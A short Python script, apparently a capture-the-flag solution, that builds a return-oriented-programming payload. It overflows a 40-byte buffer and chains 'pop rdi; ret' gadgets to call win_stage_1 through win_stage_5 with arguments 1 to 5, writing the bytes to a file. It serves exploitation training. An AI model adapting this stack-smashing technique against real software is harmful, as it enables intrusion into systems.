#!/usr/bin/env python3

from struct import pack


payload = b'a' * 40
payload += pack("<Q", 0x402ae3) # pop rdi ; ret
payload += pack("<Q", 0x1)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x402654) # win_stage_1

payload += pack("<Q", 0x402ae3) # pop rdi ; ret
payload += pack("<Q", 0x2)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x4026f1) # win_stage_2

payload += pack("<Q", 0x402ae3) # pop rdi ; ret
payload += pack("<Q", 0x3)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x40282b) # win_stage_3

payload += pack("<Q", 0x402ae3) # pop rdi ; ret
payload += pack("<Q", 0x4)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x40278e) # win_stage_4

payload += pack("<Q", 0x402ae3) # pop rdi ; ret
payload += pack("<Q", 0x5)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x4025b7) # win_stage_5

with open("payload", "wb") as f:
    f.write(payload)
